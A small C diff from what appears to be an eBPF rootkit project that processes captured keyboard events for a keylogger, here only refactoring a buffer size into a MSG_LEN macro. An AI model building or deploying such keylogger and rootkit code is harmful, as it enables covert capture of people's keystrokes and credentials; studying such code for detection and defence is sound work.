@@ -5,8 +5,11 @@
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <bpf/libbpf.h>
+
 #include "userspace/keylogger_processor.h"
 #include "rootkit.skel.h"
+
+#define MSG_LEN 128
 
 static const char *keymap[256] = {
     [1] = "[ESC]",
@@ -86,7 +89,7 @@ int process_key_event(void *ctx, void *data, size_t data_sz)
         uint32_t value;
     } *event = data;
 
-    char msgbuf[128];
+    char msgbuf[MSG_LEN];
     const char *key_str = keymap[event->code];
 
     if (key_str)
